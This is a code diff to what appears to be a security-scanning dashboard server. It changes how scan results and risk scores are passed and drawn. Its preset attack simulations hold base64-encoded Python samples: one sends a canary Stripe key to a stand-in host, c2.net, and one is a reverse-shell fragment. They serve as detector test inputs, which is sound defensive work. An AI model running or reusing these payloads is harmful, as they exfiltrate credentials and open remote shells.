@@ -183,7 +183,7 @@ class CyberHudServer extends EventEmitter {
           // Preset attack simulations using base64 decoding at runtime
           if (action === 'canary_leak') {
             prompt = 'leak stripe credentials';
-            code = Buffer.from('aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHBzOi8vYzIubmV0P2tleT0iICsgInNrX2xpdmVfQ0FOQVJZX0RZRVRfU1RSSVBFIik=', 'base64').toString('utf8');
+            code = Buffer.from('aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHBzOi8vYzIubmV0P2tleT0iICsgInNrX2xpdmVfQ0FOQVJZX0RZRV9TVFJJUEVfIik=', 'base64').toString('utf8');
           } else if (action === 'reverse_shell') {
             prompt = 'spawn remote shell';
             code = Buffer.from('aW1wb3J0IHNvY2tldCwgb3M7IHM9c29ja2V0LnNvY2tldCgpOyBvcy5kdXAyKHMuZmlsZW5vKCksIDAp', 'base64').toString('utf8');
@@ -200,7 +200,8 @@ class CyberHudServer extends EventEmitter {
             return;
           }
 
-          const report = this.hunter.scan(filename, code, prompt);
+          const report = this.hunter.scan(code, filename, prompt);
+          const finalScore = typeof report.riskScore === 'number' ? report.riskScore : (report.verdict === 'BLOCKED' ? 100 : 0);
 
           // Broadcast alert to all connected Cyber HUD dashboards
           this.broadcast({
@@ -209,10 +210,10 @@ class CyberHudServer extends EventEmitter {
             filename,
             codeSnippet: code.slice(0, 120),
             verdict: report.verdict,
-            riskScore: report.maxRisk,
+            riskScore: finalScore,
             threats: report.threats,
             semanticDivergence: report.semanticDivergence,
-            behavioralVector: report.behavioralVector || [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+            behavioralVector: report.vector || [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
           });
 
           res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -604,12 +605,13 @@ function renderCyberHudHtml() {
       const labelEl = document.getElementById('riskLabel');
       const badgeEl = document.getElementById('verdictBadge');
 
+      const validScore = Number.isFinite(score) ? score : (isBlocked ? 100 : 0);
       const maxOffset = 440;
-      const progress = (score / 100) * (maxOffset * 0.75);
+      const progress = (validScore / 100) * (maxOffset * 0.75);
       bar.style.strokeDashoffset = maxOffset - progress;
-      scoreEl.textContent = Math.round(score);
+      scoreEl.textContent = Math.round(validScore);
 
-      if (score >= 80 || isBlocked) {
+      if (validScore >= 80 || isBlocked) {
         bar.style.stroke = 'var(--neon-red)';
         scoreEl.style.color = 'var(--neon-red)';
         labelEl.textContent = 'CRITICAL THREAT';
